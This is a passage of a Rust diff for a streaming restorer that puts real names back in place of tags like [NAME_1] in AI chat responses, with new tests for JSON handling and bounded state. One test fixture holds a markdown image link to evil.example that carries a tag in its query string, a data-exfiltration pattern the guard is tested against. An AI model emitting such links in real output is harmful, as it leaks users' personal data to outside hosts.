+            LeafAt::Json(path) => Leaf::Json(path.to_vec()),
+            LeafAt::Data => Leaf::Data,
         }
-        Value::Object(map) => {
-            for (k, x) in map {
-                path.push(Seg::Key(k.clone()));
-                leaf_paths(x, path, out);
-                path.pop();
-            }
-        }
-        _ => {}
     }
 }
 
-fn render_path(path: &[Seg]) -> String {
-    path.iter()
-        .map(|s| match s {
-            Seg::Key(k) => k.clone(),
-            Seg::Index(i) => i.to_string(),
-        })
-        .collect::<Vec<_>>()
-        .join("/")
+/// A restorer key built while walking a JSON value: a root, then the
+/// path's steps (`~` and `/` escaped as in a JSON pointer), `/`-separated.
+/// Past [`MAX_KEY_LEN`] it stops growing (and is never used).
+struct KeyBuf {
+    key: String,
+    root_len: usize,
+    /// Whether the first step needs a `/` after the root.
+    root_sep: bool,
+}
+
+impl KeyBuf {
+    fn new(root: String, root_sep: bool) -> Self {
+        KeyBuf {
+            root_len: root.len(),
+            key: root,
+            root_sep,
+        }
+    }
+
+    fn too_long(&self) -> bool {
+        self.key.len() > MAX_KEY_LEN
+    }
+
+    /// Add one step; returns the length to truncate back to.
+    fn push(&mut self, step: &str) -> usize {
+        let len = self.key.len();
+        if self.too_long() {
+            return len;
+        }
+        if len > self.root_len || self.root_sep {
+            self.key.push('/');
+        }
+        for c in step.chars() {
+            match c {
+                '~' => self.key.push_str("~0"),
+                '/' => self.key.push_str("~1"),
+                c => self.key.push(c),
+            }
+            if self.too_long() {
+                break;
+            }
+        }
+        len
+    }
 }
 
 /// How a key's successive values relate.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum Kind {
-    /// Known deltas (chatgpt.com appends, Claude text deltas).
+    /// Known deltas of text (Claude text deltas, non-JSON SSE data).
     Delta,
+    /// Known deltas under a chatgpt.com patch path: text or JSON text (a
+    /// tool call, a canvas document), as its start tells.
+    Patch,
     /// Known deltas of JSON text (tool-call `partial_json`).
     JsonDelta,
     /// Unknown: a value that extends the previous one is a snapshot of the
@@ -941,14 +1407,20 @@ enum Kind {
 struct Track {
     restorer: TextRestorer,
     kind: Kind,
-    /// [`Kind::Auto`]: the previous value as it came, and as it went out.
+    /// [`Kind::Auto`]: the previous value as it came, and as it went out;
+    /// `prev_clean`: whether that output is the previous value's own (no
+    /// text held back before it went into it).
     prev_raw: String,
     prev_out: String,
+    prev_clean: bool,
     /// The last raw text pushed (what the restorer may be holding back is a
     /// suffix of it).
     recent: String,
-    /// The item (sequence number) and leaf that hold this key's latest text.
+    /// While text is held back: the item (sequence number) and leaf that
+    /// hold this key's latest text.
     last: Option<(u64, Leaf)>,
+    /// When it was last used (for dropping idle tracks).
+    used: u64,
 }
 
 /// Keep the last `max` bytes of `s` (at a character boundary).
@@ -977,11 +1449,35 @@ fn held_tag_is_complete(engine: &Engine, scope: &str, track: &Track) -> bool {
     engine.restore(tail, scope) != tail
 }
 
+/// Can what `track` holds back, followed by `value`, still form a surrogate
+/// (so `value` goes on from it)?
+fn held_joins(engine: &Engine, scope: &str, track: &Track, value: &str) -> bool {
+    let held = track.restorer.pending_len();
+    if held == 0 || held > track.recent.len() {
+        return true;
+    }
+    let mut start = track.recent.len() - held;
+    while !track.recent.is_char_boundary(start) {
+        start += 1;
+    }
+    let tail = &track.recent[start..];
+    // A surrogate is short: the start of the value tells.
+    let mut cut = value.len().min(256);
+    while !value.is_char_boundary(cut) {
+        cut -= 1;
+    }
+    let probe = &value[..cut];
+    let mut r = engine.stream_restorer(scope);
+    let out = r.push(&format!("{tail}{probe}"));
+    r.pending_len() > probe.len() || !out.starts_with(tail)
+}
+
 /// The per-stream state shared by SSE and NDJSON.
 struct Events {
     engine: Engine,
     scope: String,
-    tracks: HashMap<String, Track>,
+    /// Keyed so that a path and everything under it are one range.
+    tracks: BTreeMap<String, Track>,
     /// Keys holding text back.
     pending: HashSet<String>,
     /// Items held back, oldest first; the first has sequence `first_seq`.
@@ -993,6 +1489,17 @@ struct Events {
     /// chatgpt.com delta encoding: the last patch path and operation.
     last_p: String,
     last_o: Option<String>,
+    /// Pushes so far (the clock of [`Track::used`]).
+    uses: u64,
+    /// Bytes of `prev_raw` and `prev_out` over all tracks.
+    retained: usize,
+    /// Tracks kept before dropping idle ones.
+    track_limit: usize,
+    /// New tracks started by the item being processed.
+    new_in_item: usize,
+    /// Tracks looked at by [`Events::reset`] (tests check the work done).
+    #[cfg(test)]
+    reset_visits: usize,
 }
 
 fn is_patch_event(v: &Value) -> bool {
@@ -1003,10 +1510,25 @@ fn is_patch_event(v: &Value) -> bool {
     })
 }
 
-/// Is `text` the start of a JSON object or array that is not finished yet
-/// (`{"q": "x`, `[1, "a`)? Text that merely starts with a bracket
-/// (`[NAME_1] said`, `[1] see`) is not.
-fn is_json_prefix(text: &str) -> bool {
+/// How text starts, read as JSON.
+#[derive(Debug, PartialEq, Eq)]
+enum JsonStart {
+    /// An unfinished object or array that has reached a string or an
+    /// object (`{"`, `["`, `[1, {`): JSON text.
+    Clear,
+    /// An unfinished object or array, nothing telling yet (`[`, `[1, 2`).
+    Open,
+    /// A complete object or array ending at this byte offset (`[1]`).
+    /// The flag: whether it reached a string or an object.
+    Closed(usize, bool),
+    /// Not JSON (`[NAME_1]`, `[1] see`, prose).
+    Not,
+    /// Clearly JSON, then not valid (`["a", ]`, `{"v": NaN}`).
+    Broken,
+}
+
+/// Read the start of `text` as JSON (see [`JsonStart`]).
+fn json_start(text: &str) -> JsonStart {
     #[derive(PartialEq)]
     enum Expect {
         Value,
@@ -1019,12 +1541,20 @@ fn is_json_prefix(text: &str) -> bool {
         /// A value or the end of an array.
         ValueOrEnd,
     }
+    let invalid = |clear| {
+        if clear {
+            JsonStart::Broken
+        } else {
+            JsonStart::Not
+        }
+    };
     let b = text.as_bytes();
     if !matches!(b.first(), Some(b'{' | b'[')) {
-        return false;
+        return JsonStart::Not;
     }
     let mut stack: Vec<u8> = Vec::new();
     let mut expect = Expect::Value;
+    let mut clear = false;
     let mut i = 0;
     while i < b.len() {
         let c = b[i];
@@ -1035,6 +1565,7 @@ fn is_json_prefix(text: &str) -> bool {
         let value_start = matches!(expect, Expect::Value | Expect::ValueOrEnd);
         match c {
             b'{' | b'[' if value_start => {
+                clear |= c == b'{' && !stack.is_empty();
                 stack.push(c);
                 expect = if c == b'{' {
                     Expect::KeyOrEnd
@@ -1070,11 +1601,12 @@ fn is_json_prefix(text: &str) -> bool {
                 i += 1;
             }
             b'"' if value_start || matches!(expect, Expect::KeyOrEnd | Expect::Key) => {
+                clear = true;
                 let key = matches!(expect, Expect::KeyOrEnd | Expect::Key);
                 i += 1;
                 loop {
                     match b.get(i) {
-                        None => return true,
+                        None => return JsonStart::Clear,
                         Some(b'\\') => i += 2,
                         Some(b'"') => break,
                         Some(_) => i += 1,
@@ -1103,19 +1635,22 @@ fn is_json_prefix(text: &str) -> bool {
                 let rest = &b[i..];
                 let n = rest.len().min(word.len());
                 if rest[..n] != word[..n] {
-                    return false;
+                    return invalid(clear);
                 }
                 i += n;
                 expect = Expect::CommaOrEnd;
             }
-            _ => return false,
+            _ => return invalid(clear),
         }
         if stack.is_empty() {
-            // A complete document (more after it is not JSON text).
-            return false;
+            return JsonStart::Closed(i, clear);
         }
     }
-    true
+    if clear {
+        JsonStart::Clear
+    } else {
+        JsonStart::Open
+    }
 }
 
 /// Does `text` (after a BOM and whitespace) start like a JSON object, array
@@ -1139,16 +1674,6 @@ fn patch_key(p: &str) -> String {
     format!("\u{1}{p}")
 }
 
-fn join_key(key: &str, rel: &str) -> String {
-    if rel.is_empty() {
-        key.to_string()
-    } else if key == "\u{1}" {
-        format!("{key}{rel}")
-    } else {
-        format!("{key}/{rel}")
-    }
-}
-
 fn is_stop(item: &Item, json: Option<&Value>) -> bool {
     item.data == "[DONE]"
         || matches!(item.name(), "done" | "message_stop" | "content_block_stop")
@@ -1168,7 +1693,7 @@ impl Events {
         Events {
             engine: engine.clone(),
             scope: scope.to_string(),
-            tracks: HashMap::new(),
+            tracks: BTreeMap::new(),
             pending: HashSet::new(),
             queue: VecDeque::new(),
             first_seq: 0,
@@ -1176,12 +1701,19 @@ impl Events {
             current: Vec::new(),
             last_p: String::new(),
             last_o: None,
+            uses: 0,
+            retained: 0,
+            track_limit: MAX_TRACKS,
+            new_in_item: 0,
+            #[cfg(test)]
+            reset_visits: 0,
         }
     }
 
     /// Restore one item; returns the items ready to go out, in order.
     fn on_item(&mut self, mut item: Item) -> Vec<Item> {
         let seq = self.first_seq + self.queue.len() as u64;
+        self.new_in_item = 0;
         let looks_json = looks_like_json(&item.data);
         // Parsed as browsers do (a BOM, lone surrogates); JSON-looking data
         // that still does not parse goes out as it came, never restored as
@@ -1193,6 +1725,10 @@ impl Events {
         };
         if is_stop(&item, json.as_ref()) {
             self.flush_all(seq);
+        } else if looks_json && item.sse.is_some() && self.pending.contains(TEXT_KEY) {
+            // Not text, but it comes after the text held back: that text
+            // goes out first, into the event it came in.
+            self.flush_key(TEXT_KEY, seq);
         }
         let mut changed = false;
         match json.as_mut() {
@@ -1203,7 +1739,7 @@ impl Events {
                 && item.data != "[DONE]" =>
             {
                 let mut data = item.data.clone();
-                changed = self.push(TEXT_KEY, seq, Leaf::Data, &mut data, Kind::Delta);
+                changed = self.push(TEXT_KEY, seq, LeafAt::Data, &mut data, Kind::Delta);
                 item.text = Some(data);
             }
             None => {}
@@ -1216,6 +1752,7 @@ impl Events {
         item.changed |= changed;
         self.queued_bytes += item.data.len();
         self.queue.push_back(item);
+        self.evict();
         if !self.pending.is_empty()
             && self.queue.len() < MAX_HELD_EVENTS
             && self.queued_bytes < MAX_HELD_BYTES
@@ -1243,27 +1780,77 @@ impl Events {
         if is_patch_event(v) {
             return self.patch_event(seq, v);
         }
-        let index = v.get("index").map(Value::to_string).unwrap_or_default();
+        // A top-level `index` tells parallel blocks apart; only a short one
+        // is part of the key.
+        let index = match v.get("index") {
+            Some(Value::Number(n)) => n.to_string(),
+            Some(Value::String(i)) if i.len() <= MAX_INDEX_LEN => format!("{i:?}"),
+            _ => String::new(),
+        };
         let delta = matches!(
             v.get("type").and_then(Value::as_str),
             Some("content_block_delta" | "completion")
         );
-        let prefix = format!("{name}|{index}|");
-        let mut paths = Vec::new();
-        leaf_paths(v, &mut Vec::new(), &mut paths);
-        let mut changed = false;
-        for path in paths {
-            let kind = match path.last() {
-                Some(Seg::Key(k)) if JSON_DELTA_KEYS.contains(&k.as_str()) => Kind::JsonDelta,
-                _ if delta => Kind::Delta,
-                _ => Kind::Auto,
-            };
-            let key = format!("{prefix}{}", render_path(&path));
-            if let Some(Value::String(s)) = pointer_mut(v, &path) {
-                changed |= self.push(&key, seq, Leaf::Json(path), s, kind);
+        let kind = move |last: Option<&str>| match last {
+            Some(k) if JSON_DELTA_KEYS.contains(&k) => Kind::JsonDelta,
+            _ if delta => Kind::Delta,
+            _ => Kind::Auto,
+        };
+        let mut key = KeyBuf::new(format!("{name}|{index}|"), false);
+        self.walk(seq, v, &mut key, &mut Vec::new(), &kind)
+    }
+
+    /// Restore the string leaves under `v`, whose restorer key is `key` and
+    /// whose place in the item is `path` (both as they came on return);
+    /// `kind` tells a leaf's kind from its last key. A leaf whose key is
+    /// too long, or that would start a track past the item's share, is
+    /// restored on its own.
+    fn walk(
+        &mut self,
+        seq: u64,
+        v: &mut Value,
+        key: &mut KeyBuf,
+        path: &mut Vec<Seg>,
+        kind: &dyn Fn(Option<&str>) -> Kind,
+    ) -> bool {
+        match v {
+            Value::String(s) => {
+                let last = match path.last() {
+                    Some(Seg::Key(k)) => Some(k.as_str()),
+                    _ => None,
+                };
+                let kind = kind(last);
+                if key.too_long()
+                    || (self.new_in_item >= MAX_NEW_TRACKS && !self.tracks.contains_key(&key.key))
+                {
+                    return restore_string(&self.engine, &self.scope, s, 0);
+                }
+                self.push(&key.key, seq, LeafAt::Json(path), s, kind)
             }
+            Value::Array(items) => {
+                let mut changed = false;
+                for (i, x) in items.iter_mut().enumerate() {
+                    let len = key.push(&i.to_string());
+                    path.push(Seg::Index(i));
+                    changed |= self.walk(seq, x, key, path, kind);
+                    path.pop();
+                    key.key.truncate(len);
+                }
+                changed
+            }
+            Value::Object(map) => {
+                let mut changed = false;
+                for (k, x) in map.iter_mut() {
+                    let len = key.push(k);
+                    path.push(Seg::Key(k.clone()));
+                    changed |= self.walk(seq, x, key, path, kind);
+                    path.pop();
+                    key.key.truncate(len);
+                }
+                changed
+            }
+            _ => false,
         }
-        changed
     }
 
     /// chatgpt.com delta encoding: `{"p": path, "o": op, "v": value}`,
@@ -1325,90 +1912,147 @@ impl Events {
     }
 
     fn apply_op(&mut self, seq: u64, base: Vec<Seg>, p: &str, op: &str, v: &mut Value) -> bool {
-        let key = patch_key(p);
+        let root = patch_key(p);
         if matches!(op, "add" | "replace" | "set") {
             // A new value replaces the old one (and everything under it).
             // Any other op (`append`, or one parda does not know, such as
             // `truncate`) keeps the text's state.
-            self.reset(&key, seq);
+            self.reset(&root, seq);
         }
-        match v {
-            Value::String(s) => self.push(&key, seq, Leaf::Json(base), s, Kind::Delta),
-            Value::Object(_) | Value::Array(_) => {
-                let mut paths = Vec::new();
-                leaf_paths(v, &mut Vec::new(), &mut paths);
-                let mut changed = false;
-                for rel in paths {
-                    let k = join_key(&key, &render_path(&rel));
-                    let mut full = base.clone();
-                    full.extend(rel.iter().cloned());
-                    if let Some(Value::String(s)) = pointer_mut(v, &rel) {
-                        changed |= self.push(&k, seq, Leaf::Json(full), s, Kind::Delta);
-                    }
-                }
-                changed
+        let mut key = KeyBuf::new(root, !p.is_empty());
+        let mut path = base;
+        self.walk(seq, v, &mut key, &mut path, &|_| Kind::Patch)
+    }
+
+    /// Flush and forget `key` and every key under it (a range of keys:
+    /// only those are looked at).
+    fn reset(&mut self, key: &str, seq: u64) {
+        let mut keys: Vec<String> = Vec::new();
+        if key == "\u{1}" {
+            // The root patch path: every patch path.
+            keys.extend(
+                self.tracks
+                    .range::<str, _>((Bound::Included("\u{1}"), Bound::Excluded("\u{2}")))
+                    .map(|(k, _)| k.clone()),
+            );
+        } else {
+            if self.tracks.contains_key(key) {
+                keys.push(key.to_string());
             }
-            _ => false,
+            // `key/…`: from `key/` up to `key0` (`0` follows `/`).
+            let (lo, hi) = (format!("{key}/"), format!("{key}0"));
+            keys.extend(
+                self.tracks
+                    .range::<str, _>((Bound::Included(lo.as_str()), Bound::Excluded(hi.as_str())))
+                    .map(|(k, _)| k.clone()),
+            );
+        }
+        #[cfg(test)]
+        {
+            self.reset_visits += keys.len();
+        }
+        for k in keys {
+            self.flush_key(&k, seq);
+            self.drop_track(&k);
         }
     }
 
-    /// Flush and forget `key` and every key under it.
-    fn reset(&mut self, key: &str, seq: u64) {
-        let under = format!("{key}/");
-        let keys: Vec<String> = self
-            .tracks
-            .keys()
-            .filter(|k| {
-                if key == "\u{1}" {
-                    k.starts_with(key)
-                } else {
-                    *k == key || k.starts_with(&under)
-                }
-            })
-            .cloned()
-            .collect();
-        for k in keys {
-            self.flush_key(&k, seq);
-            self.tracks.remove(&k);
+    /// Forget one track.
+    fn drop_track(&mut self, key: &str) {
+        self.pending.remove(key);
+        if let Some(t) = self.tracks.remove(key) {
+            self.retained -= t.prev_raw.len() + t.prev_out.len();
         }
+    }
+
+    /// Keep the stream's state bounded: past [`MAX_TRACKS`] tracks (or
+    /// [`MAX_RETAINED`] bytes of previous values), drop the longest-unused
+    /// tracks that hold nothing back, down to half. A dropped track starts
+    /// afresh if its key comes back.
+    fn evict(&mut self) {
+        if self.tracks.len() <= self.track_limit && self.retained <= MAX_RETAINED {
+            return;
+        }
+        let mut idle: Vec<(u64, String)> = self
+            .tracks
+            .iter()
+            .filter(|(k, t)| t.restorer.pending_len() == 0 && !self.pending.contains(*k))
+            .map(|(k, t)| (t.used, k.clone()))
+            .collect();
+        idle.sort_unstable();
+        for (_, k) in idle {
+            if self.tracks.len() <= MAX_TRACKS / 2 && self.retained <= MAX_RETAINED / 2 {
+                break;
+            }
+            self.drop_track(&k);
+        }
+        self.track_limit = MAX_TRACKS.max(2 * self.tracks.len());
     }
 
     /// Restore `s` (the value of `key` in item `seq`, at `leaf`) in place.
-    fn push(&mut self, key: &str, seq: u64, leaf: Leaf, s: &mut String, kind: Kind) -> bool {
+    fn push(&mut self, key: &str, seq: u64, leaf: LeafAt<'_>, s: &mut String, kind: Kind) -> bool {
+        self.uses += 1;
         let Events {
             engine,
             scope,
             tracks,
+            uses,
+            new_in_item,
             ..
         } = self;
-        // JSON text arriving in pieces under a key parda does not know is
-        // restored with JSON escaping, never as plain text.
-        let json_text =
-            kind == Kind::JsonDelta || (kind == Kind::Auto && is_json_prefix(s.trim_start()));
+        let fresh = !tracks.contains_key(key);
+        if fresh {
+            *new_in_item += 1;
+        }
+        // JSON text arriving in pieces is restored with JSON escaping, never
+        // as plain text; under a key parda does not know (or a patch path)
+        // the text's start tells which it is.
         let track = tracks.entry(key.to_string()).or_insert_with(|| Track {
-            restorer: if json_text {
-                TextRestorer::json(engine, scope)
-            } else {
-                TextRestorer::plain(engine, scope)
+            restorer: match kind {
+                Kind::JsonDelta => TextRestorer::json(engine, scope),
+                Kind::Delta => TextRestorer::plain(engine, scope),
+                Kind::Patch | Kind::Auto => TextRestorer::sniffing(engine, scope),
             },
             kind,
             prev_raw: String::new(),
             prev_out: String::new(),
+            prev_clean: true,
             recent: String::new(),
             last: None,
+            used: *uses,
         });
-        if track.kind == Kind::Auto && json_container(s).is_some() {
+        track.used = *uses;
+        let whole_json = matches!(track.kind, Kind::Auto) || (track.kind == Kind::Patch && fresh);
+        let whole = if whole_json { json_in(s) } else { JsonIn::Text };
+        if matches!(whole, JsonIn::Container(_) | JsonIn::Invalid) {
             // A JSON document in a string, sent whole: restored at its own
-            // level, never spliced into as text.
-            return restore_string(engine, scope, s, 0);
+            // level (left alone if it can never parse), never spliced into
+            // as text. A patch path's appends that follow go on as JSON text.
+            if track.kind == Kind::Patch {
+                track.restorer = TextRestorer::json(engine, scope);
+                let _ = track.restorer.push(s);
+                return restore_string(engine, scope, s, 0);
+            }
+            return self.push_whole(key, seq, s);
         }
+        // A value that extends the previous one is a snapshot of the whole
+        // text so far. One equal to it is too, unless that could lose text:
+        // while text is held back, or when the previous output carried text
+        // held back from before it (then it is a delta that repeats).
+        let held = track.restorer.pending_len();
         let snapshot = track.kind == Kind::Auto
             && !track.prev_raw.is_empty()
-            && s.starts_with(&track.prev_raw);
-        if track.kind == Kind::Auto && !snapshot && held_tag_is_complete(engine, scope, track) {
-            // A new value that does not extend the last one, while a whole
-            // tag is held back: the last value was complete (a title, a
-            // status line), so the tag goes back into it, not into this one.
+            && s.starts_with(&track.prev_raw)
+            && (s.len() > track.prev_raw.len() || (held == 0 && track.prev_clean));
+        if track.kind == Kind::Auto
+            && !snapshot
+            && held > 0
+            && !track.restorer.is_sniffing()
+            && (held_tag_is_complete(engine, scope, track) || !held_joins(engine, scope, track, s))
+        {
+            // A new value that does not extend the last one, while text is
+            // held back that this value cannot complete (or a whole tag): the
+            // held text goes back into the last value, not into this one.
             self.flush_key(key, seq);
             return self.push(key, seq, leaf, s, kind);
         }
@@ -1429,17 +2073,60 @@ impl Events {
             track.restorer.push(&raw)
         };
         if track.kind == Kind::Auto {
+            self.retained -= track.prev_raw.len() + track.prev_out.len();
+            if !snapshot {
+                track.prev_clean = held == 0;
+            }
             track.prev_raw.clone_from(&raw);
             track.prev_out.clone_from(&out);
+            self.retained += track.prev_raw.len() + track.prev_out.len();
         }
-        track.last = Some((seq, leaf));
         if track.restorer.pending_len() > 0 {
+            track.last = Some((seq, leaf.to_leaf()));
             self.pending.insert(key.to_string());
         } else {
+            track.last = None;
             self.pending.remove(key);
         }
         let changed = out != raw;
         *s = out;
+        changed
+    }
+
+    /// An Auto track's value that is a whole JSON document (or JSON that can
+    /// never parse): restored on its own; its text still goes to the track
+    /// as context (a URL guard's state) and as its previous value.
+    fn push_whole(&mut self, key: &str, seq: u64, s: &mut String) -> bool {
+        let Some(track) = self.tracks.get(key) else {
+            return false;
+        };
+        let extends = !track.prev_raw.is_empty() && s.starts_with(&track.prev_raw);
+        if track.restorer.pending_len() > 0 && !extends {
+            // Held text from before belongs to the last value.
+            self.flush_key(key, seq);
+        }
+        let raw = s.clone();
+        let changed = restore_string(&self.engine, &self.scope, s, 0);
+        let Some(track) = self.tracks.get_mut(key) else {
+            return changed;
+        };
+        // What was held back is in this value's own output now.
+        let _ = track.restorer.finish();
+        let context = if extends {
+            &raw[track.prev_raw.len()..]
+        } else {
+            &raw[..]
+        };
+        track.restorer.skip(context);
+        track.recent.push_str(context);
+        keep_tail(&mut track.recent, 256);
+        self.retained -= track.prev_raw.len() + track.prev_out.len();
+        track.prev_raw.clone_from(&raw);
+        track.prev_out.clone_from(s);
+        track.prev_clean = true;
+        self.retained += track.prev_raw.len() + track.prev_out.len();
+        track.last = None;
+        self.pending.remove(key);
         changed
     }
 
@@ -1457,6 +2144,7 @@ impl Events {
         }
         if track.kind == Kind::Auto {
             track.prev_out.push_str(&tail);
+            self.retained += tail.len();
         }
         let Some((seq, leaf)) = track.last.clone() else {
             return;
@@ -1798,6 +2486,391 @@ mod tests {
         assert!(out.ends_with("{\"result\": {\"done\": true}}"));
     }
 
+    /// An OpenAI-compatible answer (deltas under a key parda does not know).
+    fn openai_stream(deltas: &[&str]) -> Vec<u8> {
+        let mut evs: Vec<(Option<&str>, String)> = deltas
+            .iter()
+            .map(|d| {
+                (
+                    None,
+                    json!({"id": "c1", "object": "chat.completion.chunk",
+                           "choices": [{"index": 0, "delta": {"content": d}}]})
+                    .to_string(),
+                )
+            })
+            .collect();
+        evs.push((None, "[DONE]".to_string()));
+        sse(&evs)
+    }
+
+    fn openai_text(out: &[u8]) -> String {
+        events(out)
+            .iter()
+            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
+            .filter_map(|v| {
+                v["choices"][0]["delta"]["content"]
+                    .as_str()
+                    .map(str::to_string)
+            })
+            .collect()
+    }
+
+    /// Review finding: a track is JSON text only once what it carried is
+    /// clearly JSON (`{"`, `["`, `[{`), never because its first piece was a
+    /// lone `[`, `[1` or `{`; prose after such a start is restored as text
+    /// and its quotes and backslashes are left alone.
+    #[test]
+    fn tracks_are_json_text_only_when_they_carry_json() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let prose = "1] Open \"C:\\Users\\me\\Documents\" then \"\\d+\" regex";
+        let cases: Vec<(Vec<String>, String)> = vec![
+            (vec!["[".into(), prose.into()], format!("[{prose}")),
+            (
+                vec![
+                    "[".into(),
+                    format!("NAME_1], your address \"{q}\" and [NAME_1]."),
+                ],
+                format!("Ravi Kumar, your address \"{QUOTED}\" and Ravi Kumar."),
+            ),
+            (
+                vec!["[1".into(), ", 2] items for [NAME_1]".into()],
+                "[1, 2] items for Ravi Kumar".into(),
+            ),
+            (
+                vec!["{".into(), " is a brace: \"C:\\x\" [NAME_1]".into()],
+                "{ is a brace: \"C:\\x\" Ravi Kumar".into(),
+            ),
+            // JSON text that turns into prose goes on as it came.
+            (
+                vec!["[\"a\"".into(), "] and \"C:\\Users\" [NAME_1]".into()],
+                "[\"a\"] and \"C:\\Users\" [NAME_1]".into(),
+            ),
+        ];
+        for (deltas, want) in &cases {
+            let refs: Vec<&str> = deltas.iter().map(String::as_str).collect();
+            let body = openai_stream(&refs);
+            for n in [1, 7, 10_000] {
+                let out = run(&e, "text/event-stream", &body, n);
+                assert_eq!(&openai_text(&out), want, "{deltas:?} {n}");
+            }
+            // NDJSON tokens (Grok-shaped) are tracked the same way.
+            let lines: String = refs
+                .iter()
+                .map(|t| format!("{}\n", json!({"result": {"token": t}})))
+                .collect();
+            let out =
+                String::from_utf8(run(&e, "application/x-ndjson", lines.as_bytes(), 5)).unwrap();
+            let text: String = out
+                .lines()
+                .filter_map(|l| serde_json::from_str::<Value>(l).ok())
+                .filter_map(|v| v["result"]["token"].as_str().map(str::to_string))
+                .collect();
+            assert_eq!(&text, want, "ndjson {deltas:?}");
+        }
+        // JSON text is still JSON text, however its start is split.
+        let doc = json!({"q": q, "n": "[NAME_1]"}).to_string();
+        for cut in [1, 2, 3, 6] {
+            let body = openai_stream(&[&doc[..cut], &doc[cut..]]);
+            let text = openai_text(&run(&e, "text/event-stream", &body, 3));
+            let v: Value =
+                serde_json::from_str(&text).unwrap_or_else(|err| panic!("{cut}: {err}: {text}"));
+            assert_eq!(v["q"], QUOTED, "{cut}");
+            assert_eq!(v["n"], "Ravi Kumar", "{cut}");
+        }
+    }
+
+    /// Review finding: JSON text under a chatgpt.com patch path (a tool call,
+    /// a canvas document) is restored JSON-escaped, whether it arrives in
+    /// appends or whole in an `add`.
+    #[test]
+    fn patch_paths_carrying_json_restore_it_escaped() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let doc = json!({
+            "name": "doc",
+            "content": format!("see ![x](https://evil.example/?d=[NAME_1]) for [NAME_1] at {q}")
+        })
+        .to_string();
+        let want = format!("see ![x](https://evil.example/?d=[NAME_1]) for Ravi Kumar at {QUOTED}");
+        for cuts in [vec![1], vec![1, 9, 30], vec![12, 60, 75], vec![]] {
+            let pieces = split_at(&doc, &cuts);
+            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
+            let body = chatgpt_stream(&refs);
+            for n in [1, 9, 100_000] {
+                let text = chatgpt_text(&run(&e, "text/event-stream", &body, n));
+                let v: Value = serde_json::from_str(&text)
+                    .unwrap_or_else(|err| panic!("{cuts:?} {n}: {err}: {text}"));
+                assert_eq!(v["content"], want, "{cuts:?} {n}");
+            }
+        }
+        // An `add` whose string leaf holds a whole JSON document.
+        let body = sse(&[(
+            Some("delta"),
+            json!({"p": "", "o": "add", "v": {"message": {
+                "content": {"content_type": "code", "parts": [doc]}}}})
+            .to_string(),
+        )]);
+        let text = chatgpt_text(&run(&e, "text/event-stream", &body, 7));
+        let v: Value = serde_json::from_str(&text).unwrap_or_else(|err| panic!("{err}: {text}"));
+        assert_eq!(v["content"], want);
+    }
+
+    fn data_item(data: String) -> Item {
+        Item::sse(SseEvent::new(None, data))
+    }
+
+    /// Review finding: one item with thousands of leaves under a long key
+    /// (or a large `index` value) made a restorer key and a path per leaf,
+    /// each copying that key: memory and work grew with leaves x key length.
+    /// Keys stay short and their number per item bounded; the item still
+    /// goes out as it came, its tags restored.
+    #[test]
+    fn many_leaves_under_a_long_key_take_bounded_state() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let long = "K".repeat(20_000);
+        let mut inner = serde_json::Map::new();
+        for i in 0..3000 {
+            inner.insert(format!("{i}"), json!("a"));
+        }
+        inner.insert("tag".into(), json!("[NAME_1]"));
+        let mut idx = serde_json::Map::new();
+        for i in 0..3000 {
+            idx.insert(format!("k{i}"), json!("a"));
+        }
+        for doc in [
+            json!({ long.clone(): Value::Object(inner.clone()) }),
+            json!({"index": Value::Object(idx), "t": "[NAME_1]"}),
+        ] {
+            let data = doc.to_string();
+            let mut ev = Events::new(&e, SCOPE);
+            let out = ev.on_item(data_item(data.clone()));
+            let out: Vec<Bytes> = out
+                .into_iter()
+                .chain(ev.finish())
+                .map(Item::render)
+                .collect();
+            let got: Value = serde_json::from_str(&datas(&out.concat())[0]).unwrap();
+            let want: Value =
+                serde_json::from_str(&data.replace("[NAME_1]", "Ravi Kumar")).unwrap();
+            assert_eq!(got, want);
+            let key_bytes: usize = ev.tracks.keys().map(String::len).sum();
+            assert!(
+                key_bytes <= 1024 * 1024 && ev.tracks.len() <= 4096,
+                "{} tracks, {key_bytes} key bytes",
+                ev.tracks.len()
+            );
+        }
+    }
+
+    /// Review finding: tracks were kept for the whole stream (each Auto
+    /// track with copies of its last value), and every add/replace op
+    /// looked at every track. State stays bounded and resets look only at
+    /// the keys under the path.
+    #[test]
+    fn stream_state_stays_bounded_and_resets_are_cheap() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        // Many distinct keys (small values), then a few large values: the
+        // number of tracks and the bytes of previous values kept are
+        // bounded, and every event still goes out as it came.
+        let small = "y".repeat(100);
+        let large = "z".repeat(1024 * 1024);
+        let mut ev = Events::new(&e, SCOPE);
+        for i in 0..20_012 {
+            let value = if i < 20_000 { &small } else { &large };
+            let data = json!({ format!("k{i}"): value }).to_string();
+            let out = ev.on_item(data_item(data.clone()));
+            let out: Vec<Bytes> = out.into_iter().map(Item::render).collect();
+            assert_eq!(datas(&out.concat()), [data]);
+            if i % 1000 == 0 || i >= 20_000 {
+                let retained: usize = ev
+                    .tracks
+                    .values()
+                    .map(|t| t.prev_raw.len() + t.prev_out.len())
+                    .sum();
+                assert_eq!(retained, ev.retained, "event {i}");
+            }
+            assert!(
+                ev.tracks.len() <= 8192 && ev.retained <= 16 * 1024 * 1024,
+                "event {i}: {} tracks, {} bytes",
+                ev.tracks.len(),
+                ev.retained
+            );
+        }
+        // chatgpt.com adds at distinct paths: each reset looks at the keys
+        // under its path only.
+        let mut ev = Events::new(&e, SCOPE);
+        let n = 5000;
+        for i in 0..n {
+            let data = json!({"p": format!("/m/{i}"), "o": "add", "v": "x"}).to_string();
+            let _ = ev.on_item(data_item(data));
+        }
+        assert!(
+            ev.reset_visits <= 4 * n,
+            "{} tracks looked at",
+            ev.reset_visits
+        );
+        // A reset still forgets the path and everything under it, and only
+        // that.
+        let mut ev = Events::new(&e, SCOPE);
+        for p in ["/m", "/m/0", "/m/0/a", "/m0", "/n"] {
+            let data = json!({"p": p, "o": "append", "v": "x"}).to_string();
+            let _ = ev.on_item(data_item(data));
+        }
